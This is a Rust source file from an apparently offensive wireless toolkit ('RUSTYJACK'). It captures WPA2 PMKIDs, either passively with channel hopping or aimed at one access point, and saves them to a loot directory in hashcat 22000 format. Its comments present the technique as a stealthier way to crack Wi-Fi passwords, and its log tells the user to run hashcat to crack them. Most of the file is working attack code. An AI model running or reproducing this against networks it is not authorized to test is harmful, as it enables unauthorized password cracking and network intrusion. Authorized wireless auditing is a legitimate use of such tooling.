//! PMKID capture and extraction
//!
//! PMKID attacks allow cracking WPA2 passwords without capturing a full handshake.
//! The PMKID is sent in the first EAPOL message from the AP, so no deauth is needed.
//!
//! ## How it works
//! 1. Send association request to target AP
//! 2. AP responds with EAPOL Message 1 containing PMKID in RSN IE
//! 3. Extract PMKID and crack offline with hashcat mode 22000
//!
//! ## Advantages over handshake capture
//! - No need to wait for client
//! - No deauth attack needed (stealthier)
//! - Works on networks with no active clients
//! - Faster acquisition (seconds vs minutes)

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use chrono::Local;

use crate::capture::{CaptureFilter, CapturedPacket, PacketCapture};
use crate::error::{Result, WirelessError};
use crate::frames::MacAddress;
use crate::interface::WirelessInterface;

/// PMKID data extracted from EAPOL Message 1
#[derive(Debug, Clone)]
pub struct PmkidCapture {
    /// Target BSSID (Access Point MAC)
    pub bssid: MacAddress,
    /// Client MAC that received the PMKID
    pub client_mac: MacAddress,
    /// The PMKID value (16 bytes)
    pub pmkid: [u8; 16],
    /// SSID of the network (if known)
    pub ssid: Option<String>,
    /// Timestamp of capture
    pub timestamp: Instant,
}

impl PmkidCapture {
    /// Convert to hashcat 22000 format
    /// Format: WPA*01*PMKID*BSSID*CLIENT*ESSID_HEX
    pub fn to_hashcat_22000(&self) -> String {
        let pmkid_hex: String = self.pmkid.iter().map(|b| format!("{:02x}", b)).collect();
        let bssid_hex: String = self.bssid.0.iter().map(|b| format!("{:02x}", b)).collect();
        let client_hex: String = self
            .client_mac
            .0
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect();
        let ssid_hex: String = self
            .ssid
            .as_ref()
            .map(|s| s.bytes().map(|b| format!("{:02x}", b)).collect())
            .unwrap_or_default();

        format!(
            "WPA*01*{}*{}*{}*{}",
            pmkid_hex, bssid_hex, client_hex, ssid_hex
        )
    }

    /// Convert to hcxpcapngtool compatible format
    pub fn to_hcx_format(&self) -> String {
        self.to_hashcat_22000()
    }
}

/// PMKID capturer
pub struct PmkidCapturer {
    interface_name: String,
    captures: Vec<PmkidCapture>,
}

impl PmkidCapturer {
    /// Create new PMKID capturer
    pub fn new(interface: &WirelessInterface) -> Result<Self> {
        if !interface.is_monitor_mode()? {
            return Err(WirelessError::MonitorMode(
                "Interface must be in monitor mode for PMKID capture".into(),
            ));
        }

        Ok(Self {
            interface_name: interface.name().to_string(),
            captures: Vec::new(),
        })
    }

    /// Create from interface name
    pub fn from_name(name: &str) -> Result<Self> {
        Ok(Self {
            interface_name: name.to_string(),
            captures: Vec::new(),
        })
    }

    /// Passive PMKID capture - listen for PMKIDs from any network
    /// This captures PMKIDs from existing authentication attempts
    pub fn passive_capture(&mut self, duration: Duration) -> Result<Vec<PmkidCapture>> {
        log::info!("Starting passive PMKID capture for {:?}", duration);

        let mut capture = PacketCapture::new(&self.interface_name)?;
        capture.set_filter(CaptureFilter::eapol_only());

        let start = Instant::now();
        let mut found = Vec::new();

        while start.elapsed() < duration {
            if let Some(packet) = capture.next_packet()? {
                if let Some(pmkid) = self.extract_pmkid(&packet) {
                    log::info!("Found PMKID for BSSID: {}", pmkid.bssid);
                    found.push(pmkid.clone());
                    self.captures.push(pmkid);
                }
            }
        }

        log::info!("Passive capture complete: {} PMKIDs found", found.len());
        Ok(found)
    }

    /// Targeted PMKID capture - actively try to get PMKID from specific AP
    /// Sends association request to trigger EAPOL Message 1
    pub fn active_capture(
        &mut self,
        bssid: MacAddress,
        ssid: Option<&str>,
        timeout: Duration,
    ) -> Result<Option<PmkidCapture>> {
        log::info!("Starting active PMKID capture for BSSID: {}", bssid);

        // Start packet capture
        let mut capture = PacketCapture::new(&self.interface_name)?;
        capture.set_filter(CaptureFilter::for_bssid(bssid));

        let start = Instant::now();

        // Send authentication and association frames
        // Note: This requires sending management frames which needs implementation
        // For now, we'll do passive capture on the target BSSID

        while start.elapsed() < timeout {
            if let Some(packet) = capture.next_packet()? {
                if let Some(mut pmkid) = self.extract_pmkid(&packet) {
                    if pmkid.bssid == bssid {
                        pmkid.ssid = ssid.map(|s| s.to_string());
                        log::info!("Captured PMKID for target BSSID: {}", bssid);
                        self.captures.push(pmkid.clone());
                        return Ok(Some(pmkid));
                    }
                }
            }
        }

        log::warn!("PMKID capture timeout for BSSID: {}", bssid);
        Ok(None)
    }

    /// Extract PMKID from captured EAPOL packet
    fn extract_pmkid(&self, packet: &CapturedPacket) -> Option<PmkidCapture> {
        if !packet.is_eapol() {
            return None;
        }

        let raw = packet.frame.raw();

        // Find EAPOL data in the frame
        // Look for LLC/SNAP header with EAPOL ethertype (88 8E)
        let eapol_offset = self.find_eapol_offset(raw)?;
        let eapol_data = &raw[eapol_offset..];

        // Check EAPOL type (offset 1) - must be Key (3)
        if eapol_data.len() < 100 || eapol_data[1] != 3 {
            return None;
        }

        // EAPOL-Key starts at offset 4
        let key_data = &eapol_data[4..];

        // Key Information (2 bytes at offset 1)
        let key_info = u16::from_be_bytes([key_data[1], key_data[2]]);

        // Check if this is Message 1 (ACK set, MIC not set)
        let is_ack = (key_info & 0x0080) != 0;
        let is_mic = (key_info & 0x0100) != 0;

        if !is_ack || is_mic {
            return None; // Not Message 1
        }

        // Key Data Length (2 bytes at offset 93)
        if key_data.len() < 95 {
            return None;
        }
        let key_data_len = u16::from_be_bytes([key_data[93], key_data[94]]) as usize;

        if key_data.len() < 95 + key_data_len {
            return None;
        }

        // Search for PMKID in RSN IE
        let key_data_content = &key_data[95..95 + key_data_len];
        let pmkid = self.find_pmkid_in_rsn(key_data_content)?;

        // Get MAC addresses
        let bssid = packet.bssid()?;
        let client_mac = packet.destination()?;

        Some(PmkidCapture {
            bssid,
            client_mac,
            pmkid,
            ssid: None,
            timestamp: Instant::now(),
        })
    }

    /// Find EAPOL data offset in raw frame
    fn find_eapol_offset(&self, raw: &[u8]) -> Option<usize> {
        // Look for LLC/SNAP header: AA AA 03 00 00 00 88 8E
        for offset in [24, 26, 28, 30, 32] {
            if raw.len() < offset + 8 {
                continue;
            }

            if raw[offset..offset + 6] == [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]
                && raw[offset + 6..offset + 8] == [0x88, 0x8E]
            {
                return Some(offset + 8);
            }
        }
        None
    }

    /// Find PMKID in RSN IE
    fn find_pmkid_in_rsn(&self, data: &[u8]) -> Option<[u8; 16]> {
        let mut pos = 0;

        while pos + 2 <= data.len() {
            let tag_type = data[pos];
            let tag_len = data[pos + 1] as usize;

            if pos + 2 + tag_len > data.len() {
                break;
            }

            // RSN IE (tag 0x30) or Vendor Specific (tag 0xDD with WPA OUI)
            if tag_type == 0x30 {
                // RSN IE - search for PMKID List
                let rsn_data = &data[pos + 2..pos + 2 + tag_len];
                if let Some(pmkid) = self.extract_pmkid_from_rsn_ie(rsn_data) {
                    return Some(pmkid);
                }
            }

            pos += 2 + tag_len;
        }

        None
    }

    /// Extract PMKID from RSN IE content
    fn extract_pmkid_from_rsn_ie(&self, rsn: &[u8]) -> Option<[u8; 16]> {
        // RSN IE structure:
        // Version (2) + Group Cipher (4) + Pairwise Count (2) + Pairwise Suites (n*4)
        // + AKM Count (2) + AKM Suites (n*4) + RSN Capabilities (2)
        // + [PMKID Count (2) + PMKIDs (n*16)]

        if rsn.len() < 8 {
            return None;
        }

        let mut pos = 2; // Skip version

        // Skip Group Cipher Suite (4 bytes)
        pos += 4;
        if pos + 2 > rsn.len() {
            return None;
        }

        // Pairwise Cipher Suite Count
        let pairwise_count = u16::from_le_bytes([rsn[pos], rsn[pos + 1]]) as usize;
        pos += 2 + pairwise_count * 4;

        if pos + 2 > rsn.len() {
            return None;
        }

        // AKM Suite Count
        let akm_count = u16::from_le_bytes([rsn[pos], rsn[pos + 1]]) as usize;
        pos += 2 + akm_count * 4;

        if pos + 2 > rsn.len() {
            return None;
        }

        // RSN Capabilities (2 bytes)
        pos += 2;

        if pos + 2 > rsn.len() {
            return None;
        }

        // PMKID Count
        let pmkid_count = u16::from_le_bytes([rsn[pos], rsn[pos + 1]]) as usize;
        pos += 2;

        if pmkid_count == 0 || pos + 16 > rsn.len() {
            return None;
        }

        // Extract first PMKID (16 bytes)
        let mut pmkid = [0u8; 16];
        pmkid.copy_from_slice(&rsn[pos..pos + 16]);

        // Verify PMKID is not all zeros
        if pmkid.iter().all(|&b| b == 0) {
            return None;
        }

        Some(pmkid)
    }

    /// Get all captured PMKIDs
    pub fn captures(&self) -> &[PmkidCapture] {
        &self.captures
    }

    /// Export all captures to hashcat format
    pub fn export_hashcat(&self) -> Vec<String> {
        self.captures.iter().map(|c| c.to_hashcat_22000()).collect()
    }

    /// Clear captured PMKIDs
    pub fn clear(&mut self) {
        self.captures.clear();
    }
}

/// Quick PMKID capture function
pub fn quick_pmkid_capture(
    interface: &str,
    bssid: Option<&str>,
    ssid: Option<&str>,
    channel: u8,
    timeout_secs: u64,
) -> Result<Vec<PmkidCapture>> {
    // Setup interface
    let mut iface = WirelessInterface::new(interface)?;
    iface.set_monitor_mode()?;
    iface.set_channel(channel)?;

    let mut capturer = PmkidCapturer::new(&iface)?;

    let result = if let Some(bssid_str) = bssid {
        let target: MacAddress = bssid_str
            .parse()
            .map_err(|e| WirelessError::InvalidMac(format!("{}", e)))?;

        match capturer.active_capture(target, ssid, Duration::from_secs(timeout_secs))? {
            Some(pmkid) => vec![pmkid],
            None => Vec::new(),
        }
    } else {
        capturer.passive_capture(Duration::from_secs(timeout_secs))?
    };

    // Cleanup
    iface.set_managed_mode()?;

    Ok(result)
}

/// Result of a PMKID capture session
#[derive(Debug, Clone)]
pub struct PmkidCaptureResult {
    /// Number of PMKIDs captured
    pub pmkids_captured: usize,
    /// Total packets analyzed
    pub packets_analyzed: u64,
    /// Duration of capture
    pub duration: Duration,
    /// Hashcat format output file
    pub hashcat_file: Option<PathBuf>,
    /// Log file path
    pub log_file: PathBuf,
    /// The captured PMKIDs
    pub captures: Vec<PmkidCapture>,
}

/// Configuration for PMKID capture
#[derive(Debug, Clone)]
pub struct PmkidConfig {
    /// Interface to use (must support monitor mode)
    pub interface: String,
    /// Target BSSID (None = passive capture all)
    pub bssid: Option<String>,
    /// Target SSID (optional, for output labeling)
    pub ssid: Option<String>,
    /// Channel to capture on (0 = hop through common channels)
    pub channel: u8,
    /// Capture duration in seconds
    pub duration: u32,
}

/// Execute PMKID capture with full loot output
///
/// This is the main entry point for PMKID capture operations.
/// It handles:
/// - Interface setup (monitor mode, channel)
/// - Capture loop with progress callback
/// - Writing hashcat 22000 format output
/// - Detailed logging
pub fn execute_pmkid_capture<F>(
    loot_dir: &Path,
    config: &PmkidConfig,
    on_progress: F,
) -> Result<PmkidCaptureResult>
where
    F: Fn(f32, &str),
{
    log::info!("Starting PMKID capture on interface {}", config.interface);
    on_progress(0.05, "Initializing interface...");

    // Validate interface
    if !crate::is_wireless_interface(&config.interface) {
        return Err(WirelessError::Interface(format!(
            "{} is not a wireless interface",
            config.interface
        )));
    }

    // Create loot directory
    fs::create_dir_all(loot_dir)
        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;

    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let target_name = config
        .ssid
        .as_ref()
        .or(config.bssid.as_ref())
        .map(|s| s.replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_"))
        .unwrap_or_else(|| "passive".to_string());

    let logging_enabled = crate::logs_enabled();
    let log_file = if logging_enabled {
        let logs_dir = loot_dir.join("logs");
        fs::create_dir_all(&logs_dir)
            .map_err(|e| WirelessError::System(format!("Failed to create logs dir: {}", e)))?;
        logs_dir.join(format!("pmkid_{}_{}.txt", target_name, timestamp))
    } else {
        PathBuf::new()
    };

    on_progress(0.10, "Enabling monitor mode...");

    // Setup interface
    let mut iface = WirelessInterface::new(&config.interface)?;
    iface.set_monitor_mode()?;

    // Set channel (0 means hop through common 2.4GHz channels)
    let channels_to_scan: Vec<u8> = if config.channel == 0 {
        vec![1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10]
    } else {
        vec![config.channel]
    };

    on_progress(0.15, "Starting capture...");

    let mut capturer = PmkidCapturer::from_name(&config.interface)?;
    let start = Instant::now();
    let duration = Duration::from_secs(config.duration as u64);
    let mut channel_idx = 0;
    let mut last_channel_hop = Instant::now();
    let channel_hop_interval = Duration::from_secs(2);
    let mut packets_analyzed = 0u64;

    // Target BSSID for filtering
    let target_bssid: Option<MacAddress> = config.bssid.as_ref().and_then(|b| b.parse().ok());

    // Create packet capture
    let mut capture = PacketCapture::new(&config.interface)?;
    capture.set_filter(CaptureFilter::eapol_only());

    while start.elapsed() < duration {
        // Channel hopping for passive mode
        if channels_to_scan.len() > 1 && last_channel_hop.elapsed() > channel_hop_interval {
            let ch = channels_to_scan[channel_idx % channels_to_scan.len()];
            if iface.set_channel(ch).is_ok() {
                log::debug!("Hopped to channel {}", ch);
            }
            channel_idx += 1;
            last_channel_hop = Instant::now();
        }

        // Capture packets
        if let Ok(Some(packet)) = capture.next_packet() {
            packets_analyzed += 1;

            if let Some(pmkid) = capturer.extract_pmkid(&packet) {
                // Filter by target if specified
                if let Some(ref target) = target_bssid {
                    if pmkid.bssid != *target {
                        continue;
                    }
                }

                let mut capture_entry = pmkid.clone();
                capture_entry.ssid = config.ssid.clone();
                capturer.captures.push(capture_entry);

                log::info!(
                    "Captured PMKID from BSSID {} (total: {})",
                    pmkid.bssid,
                    capturer.captures.len()
                );

                let progress = (start.elapsed().as_secs_f32() / duration.as_secs_f32()).min(0.9);
                on_progress(
                    0.15 + progress * 0.7,
                    &format!("Captured {} PMKID(s)", capturer.captures.len()),
                );
            }
        }

        // Progress update
        let elapsed_pct = start.elapsed().as_secs_f32() / duration.as_secs_f32();
        if (elapsed_pct * 10.0) as u32 != ((elapsed_pct - 0.1) * 10.0).max(0.0) as u32 {
            on_progress(
                0.15 + elapsed_pct.min(0.85) * 0.7,
                &format!(
                    "Scanning... {} PMKID(s), {} packets",
                    capturer.captures.len(),
                    packets_analyzed
                ),
            );
        }
    }

    on_progress(0.90, "Saving captures...");

    // Restore managed mode
    if let Err(e) = iface.set_managed_mode() {
        log::warn!("Failed to restore managed mode: {}", e);
    }

    // Save hashcat format file if we captured anything
    let mut hashcat_file = None;
    if !capturer.captures.is_empty() {
        let hc_path = loot_dir.join(format!("pmkid_{}_{}.hc22000", target_name, timestamp));
        let hashcat_lines = capturer.export_hashcat();

        let mut file = fs::File::create(&hc_path)
            .map_err(|e| WirelessError::System(format!("Failed to create hashcat file: {}", e)))?;

        for line in &hashcat_lines {
            writeln!(file, "{}", line)
                .map_err(|e| WirelessError::System(format!("Failed to write: {}", e)))?;
        }

        hashcat_file = Some(hc_path);
    }

    // Write log file
    if logging_enabled {
        let mut log_content = String::new();
        log_content.push_str("====================================================\n");
        log_content.push_str("    RUSTYJACK PMKID CAPTURE LOG                     \n");
        log_content.push_str("====================================================\n\n");
        log_content.push_str(&format!(
            "Timestamp: {}\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        ));
        log_content.push_str(&format!("Interface: {}\n", config.interface));
        log_content.push_str(&format!("Duration: {} seconds\n", config.duration));
        log_content.push_str(&format!(
            "Target BSSID: {}\n",
            config.bssid.as_deref().unwrap_or("(passive)")
        ));
        log_content.push_str(&format!(
            "Target SSID: {}\n",
            config.ssid.as_deref().unwrap_or("(any)")
        ));
        log_content.push_str(&format!("Channel(s): {:?}\n", channels_to_scan));
        log_content.push_str("\n--- RESULTS ---------------------------------------\n");
        log_content.push_str(&format!("Packets analyzed: {}\n", packets_analyzed));
        log_content.push_str(&format!("PMKIDs captured: {}\n", capturer.captures.len()));

        if !capturer.captures.is_empty() {
            log_content.push_str("\nCaptured PMKIDs:\n");
            for (i, cap) in capturer.captures.iter().enumerate() {
                log_content.push_str(&format!(
                    "  {}. BSSID: {} | SSID: {}\n",
                    i + 1,
                    cap.bssid,
                    cap.ssid.as_deref().unwrap_or("(unknown)")
                ));
                log_content.push_str(&format!("     Hashcat: {}\n", cap.to_hashcat_22000()));
            }
        }

        log_content.push_str("\n====================================================\n");
        log_content.push_str("Use hashcat -m 22000 to crack the captured PMKIDs\n");
        log_content.push_str("====================================================\n");

        fs::write(&log_file, &log_content)
            .map_err(|e| WirelessError::System(format!("Failed to write log: {}", e)))?;
    }

    on_progress(1.0, "Complete");

    Ok(PmkidCaptureResult {
        pmkids_captured: capturer.captures.len(),
        packets_analyzed,
        duration: start.elapsed(),
        hashcat_file,
        log_file,
        captures: capturer.captures.clone(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pmkid_to_hashcat() {
        let pmkid = PmkidCapture {
            bssid: "AA:BB:CC:DD:EE:FF".parse().unwrap(),
            client_mac: "11:22:33:44:55:66".parse().unwrap(),
            pmkid: [
                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
                0x0F, 0x10,
            ],
            ssid: Some("TestNetwork".to_string()),
            timestamp: Instant::now(),
        };

        let hashcat = pmkid.to_hashcat_22000();
        assert!(hashcat.starts_with("WPA*01*"));
        assert!(hashcat.contains("aabbccddeeff")); // BSSID
        assert!(hashcat.contains("112233445566")); // Client MAC
    }
}
